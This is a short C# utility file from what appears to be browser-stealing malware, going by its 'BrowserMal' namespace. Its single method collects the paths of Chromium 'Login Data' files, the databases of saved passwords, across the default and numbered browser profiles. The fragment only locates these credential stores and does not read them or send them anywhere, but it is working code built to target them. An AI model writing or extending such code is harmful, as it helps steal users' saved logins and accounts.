using System.Collections.Generic;
using System.IO;

namespace BrowserMal.Browser
{
    public class Util
    {
		public static List<string> GetAllProfiles(string DirectoryPath)
		{
			List<string> list = new List<string>
			{
				DirectoryPath + "\\Default\\Login Data",
				DirectoryPath + "\\Login Data"
			};

			if (Directory.Exists(DirectoryPath))
			{
				foreach (string profile in Directory.GetDirectories(DirectoryPath))
				{
					if (profile.Contains("Profile"))
					{
						list.Add(profile + "\\Login Data");
					}
				}
			}

			return list;
		}
	}
}
